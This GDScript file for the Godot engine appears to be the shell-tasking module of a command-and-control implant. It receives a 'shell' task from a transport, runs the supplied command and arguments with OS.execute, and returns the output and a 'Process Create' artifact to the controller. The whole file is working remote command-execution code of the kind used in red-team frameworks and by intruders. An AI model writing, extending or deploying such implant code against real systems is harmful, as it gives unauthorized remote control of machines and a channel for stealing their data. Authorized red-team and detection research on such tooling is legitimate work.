extends Node


func _on_tasking_shell(transport, task):
	# {command:shell, id:4bca52fb-2e65-48bb-86cb-83bbf9b3872f, parameters:{"command": "ls", "arguments": ["-alht"]}, timestamp:1646101624.903044}

	if task.has("command") and task.get("command") == "shell" and task.has("parameters"):
		var test_json_conv = JSON.new()
		test_json_conv.parse(task.get("parameters"))
		var parameters = test_json_conv.get_data()
		var command = parameters.get("command")
		var arguments = parameters.get("arguments")
		var output = []
		print("executing the following command and arguments")
		print(command)
		print(arguments)
		print("")
		var exit_code = OS.execute(command, arguments, output, true, false)

		print("")
		print(exit_code)
		print(output)
		print("")

		transport.send(
			transport.create_task_response(
				exit_code == 0,
				true,
				task.get("id"),
				output[0],
				[
					[
						"Process Create",
						command + " " + " ".join(PackedStringArray(arguments))
					]
				]
			)
		)

	else:
		print("bad shell task: ", task)
		# TODO: agent_response in failure cases
